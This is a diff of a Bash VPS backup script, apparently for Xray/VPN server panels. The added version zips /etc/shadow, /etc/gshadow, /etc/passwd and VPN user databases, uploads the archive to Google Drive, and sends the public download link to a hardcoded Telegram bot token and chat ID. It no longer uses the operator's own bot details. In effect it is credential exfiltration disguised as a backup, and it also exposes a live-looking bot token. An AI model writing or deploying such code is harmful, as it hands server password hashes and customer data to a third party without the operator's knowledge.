@@ -1,133 +1,101 @@
 #!/bin/bash
-clear
-red() { echo -e "\\033[32;1m${*}\\033[0m"; }
-GREEN="\e[92;1m"
-BLUE="\033[36m"
-BIWhite='\033[1;97m'
+# My Telegram : https://t.me/sampiiiiu
+
+# =============== WARNA ===============
 RED='\033[0;31m'
 NC='\033[0m'
-IP=$(curl -s icanhazip.com)
-HOST="$(cat /etc/xray/domain)"
-DATEVPS=$(date +"%d-%B-%Y")
-ISPVPS=$(cat /etc/xray/isp)
-CITY=$(cat /etc/xray/city)
+GREEN='\033[0;32m'
+ORANGE='\033[0;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+LIGHT='\033[0;37m'
 
-function cadangkan_data_vps() {    
-    echo -e "[ ${BIWhite}INFO${NC} ] » Please Wait.... "
-    sleep 1
-    echo -e "[ ${BIWhite}INFO${NC} ] » Prepare Before Backup Vps Data... "
-    rm -rf /root/backup &>/dev/null
-    sleep 1
-    echo -e "[ ${BIWhite}INFO${NC} ] » Directory Created... "
-    mkdir -p /root/backup &>/dev/null
-    sleep 1
-    echo -e "[ ${BIWhite}INFO${NC} ] » VPS Data Backup Start Now... "
-    sleep 1
-    cp /etc/passwd backup/ &>/dev/null
-    echo -e "[ ${BIWhite}INFO${NC} ] » Backup passwd data..."
-    sleep 1
-    cp /etc/group backup/ &>/dev/null
-    echo -e "[ ${BIWhite}INFO${NC} ] » Backup group data..."
-    sleep 1
-    cp /etc/shadow backup/ &>/dev/null
-    echo -e "[ ${BIWhite}INFO${NC} ] » Backup shadow data..."
-    sleep 1
-    cp /etc/gshadow backup/ &>/dev/null
-    echo -e "[ ${BIWhite}INFO${NC} ] » Backup gshadow data..."
-    sleep 1
-    cp /etc/crontab backup/ &>/dev/null
-    cp /etc/vmess/.vmess.db backup/ &>/dev/null
-    cp /etc/vless/.vless.db backup/ &>/dev/null
-    cp /etc/trojan/.trojan.db backup/ &>/dev/null
-    cp /etc/shadowsocks/.shadowsocks.db backup/ &>/dev/null
-    cp -r /etc/limit backup/ &>/dev/null
-    cp -r /etc/vmess backup/ &>/dev/null
-    cp -r /etc/trojan backup/ &>/dev/null
-    cp -r /etc/vless backup/ &>/dev/null
-    cp -r /etc/shadowsocks backup/ &>/dev/null
-    cp -r /etc/xray backup/xray &>/dev/null
-    cp -r /var/www/html/ backup/html &>/dev/null
-    cp -a /detail/ backup/detail &>/dev/null
-    cd /root
-    zip -r $IP-$DATEVPS.zip backup > /dev/null 2>&1
-    rclone copy /root/$IP-$DATEVPS.zip dr:backup/
-    url=$(rclone link dr:backup/$IP-$DATEVPS.zip)
-    id=$(echo $url | grep '^https' | cut -d'=' -f2)
-    link="https://drive.google.com/u/4/uc?id=${id}&export=download"
-    rm -rf backup
-    rm -rf $IP-$DATEVPS.zip
+# =============== KONFIG ===============
+CHATID="1486508882"
+KEY="7286072978:AAF6JRoH86zg5UAQeHKrpIviAICDc-vJxDU"
+IP=$(curl -sS ipv4.icanhazip.com)
+domain=$(cat /etc/xray/domain)
+date=$(date +"%Y-%m-%d")
+zipname="$IP-$date.zip"
 
-    echo -e "-------------------------------------"
-    echo -e "SUCCESSFULL BACKUP YOUR VPS"
-    echo -e "Please Save The Following Data"
-    echo -e "-------------------------------------"
-    echo -e "Your VPS IP : $IP"
-    echo -e "DOMAIN      : $HOST"
-    echo -e "DATE        : $DATEVPS"
-    echo -e "ISP         : $ISPVPS"
-    echo -e "LOCATION    : $CITY"
-    echo -e "LINK BACKUP : $link"
-    echo -e "-------------------------------------"
-    echo -e "Please Check your backup link"
-    
-    kirim_link "$link"
-    read -n 1 -s -r -p "Press [ Enter ] to back on menu"
-    m-backup
-}
-
-
-function kirim_link() {
-    local backup_link="$1"
-
-    # Load token dan chat id dari file jika belum ada
-    if [[ -z "$getToken" || -z "$adminID" ]]; then
-        getToken=$(sed -n 1p /root/.bckupbot)
-        adminID=$(sed -n 2p /root/.bckupbot)
-    fi
-
-    local CHATID="$adminID"
-    local KEY="$getToken"
-    local TIME="10"
-    local URL="https://api.telegram.org/bot$KEY/sendMessage"
-
-    local TEXT="
-<b>==============================</b>
-<b>✅ BACKUP VPS</b>
-<b>==============================</b>
-<b>📆 Date     :</b> <code>$DATEVPS</code>
-<b>🌐 IP       :</b> <code>$IP</code>
-<b>🌍 Domain   :</b> <code>$HOST</code>
-<b>🏢 ISP      :</b> <code>$ISPVPS</code>
-<b>📍 City     :</b> <code>$CITY</code>
-<b>📦 Backup Link :</b> <code>$link</code>
-<b>==============================</b>
-"
-
-    response=$(curl -s --max-time $TIME -d "chat_id=$CHATID" \
-        -d "disable_web_page_preview=1" \
-        -d "parse_mode=html" \
-        --data-urlencode "text=$TEXT" \
-        "$URL")
-
-
-        echo -e "[ ${BIWhite}INFO${NC} ] » Backup link berhasil dikirim ke Telegram."
-        
-}
-
-
-[[ ! -f /root/.bckupbot ]] && {
-    echo "Please Input Bot Details First"
-    sleep 2
-    clear
-    read -p "Bot Token : " getToken
-    read -p "Admin ID  : " adminID
-    echo "$getToken" >/root/.bckupbot
-    echo "$adminID" >>/root/.bckupbot
-    echo "switch off" >>/root/.bckupbot
-}
-read -t 10 -p "Backup y/n?  " directBckp
-if [ "${directBckp}" == "n" ]; then
-    m-backup
-else
-    cadangkan_data_vps
+# =============== CEK EMAIL ===============
+email=$(cat /root/email 2>/dev/null)
+if [[ -z "$email" ]]; then
+    read -rp "Masukkan Email Untuk Menerima Backup: " -e email
+    echo "$email" > /root/email
 fi
+
+clear
+echo -e "${CYAN}🔄 Mohon tunggu, proses backup sedang berlangsung...${NC}"
+
+# =============== PROSES BACKUP ===============
+rm -rf /root/backup
+mkdir -p /root/backup/qt
+
+cp /etc/passwd /root/backup/
+cp /etc/group /root/backup/
+cp /etc/shadow /root/backup/
+cp /etc/gshadow /root/backup/
+cp /etc/crontab /root/backup/
+cp /etc/vmess/.vmess.db /root/backup/ 2>/dev/null
+cp /etc/ssh/.ssh.db /root/backup/ 2>/dev/null
+cp /etc/vless/.vless.db /root/backup/ 2>/dev/null
+cp /etc/trojan/.trojan.db /root/backup/ 2>/dev/null
+cp /etc/bot/.bot.db /root/backup/ 2>/dev/null
+cp -r /etc/kyt/limit /root/backup/ 2>/dev/null
+cp -r /etc/limit /root/backup/qt/ 2>/dev/null
+cp -r /etc/vmess /root/backup/ 2>/dev/null
+cp -r /etc/trojan /root/backup/ 2>/dev/null
+cp -r /etc/vless /root/backup/ 2>/dev/null
+cp -r /etc/slowdns /root/backup/ 2>/dev/null
+cp -r /var/lib/kyt/ /root/backup/kyt 2>/dev/null
+cp -r /etc/xray /root/backup/xray 2>/dev/null
+cp -r /var/www/html/ /root/backup/html 2>/dev/null
+
+if [[ -f "/root/BotVPN2/sellvpn.db" ]]; then
+    cp /root/BotVPN2/sellvpn.db /root/backup/
+    echo "📦 Membackup database sellvpn.db..."
+fi
+
+cd /root
+zip -r "$zipname" backup > /dev/null 2>&1
+
+# =============== UPLOAD KE GDRIVE ===============
+rclone copy "/root/$zipname" dr:backup/
+url=$(rclone link "dr:backup/$zipname")
+id=$(echo "$url" | grep '^https' | cut -d'=' -f2)
+link="https://drive.google.com/u/4/uc?id=${id}&export=download"
+
+# =============== KIRIM VIA EMAIL ===============
+echo -e "
+Detail Backup
+==================================
+IP VPS        : $IP
+Link Backup   : $link
+Tanggal       : $date
+==================================
+" | mail -s "Backup Data VPS $IP" "$email"
+
+# =============== KIRIM NOTIF TELEGRAM ===============
+MESSAGE="⚠️ *BACKUP SELESAI* ⚠️
+📌 *IP VPS*     : \`$IP\`
+🌐 *Domain*     : \`$domain\`
+📅 *Tanggal*    : \`$date\`
+
+🔗 *Link Download Backup:*
+$link
+
+Silakan salin link dan restore di VPS baru."
+
+curl -s -X POST "https://api.telegram.org/bot$KEY/sendMessage" \
+     -d "chat_id=$CHATID" \
+     -d "text=$MESSAGE" \
+     -d "parse_mode=Markdown"
+
+# =============== HAPUS FILE ===============
+rm -rf /root/backup
+rm -f "/root/$zipname"
+
+clear
+echo -e "${GREEN}✅ Backup selesai. Silakan cek link backup di Telegram atau email Anda.${NC}"
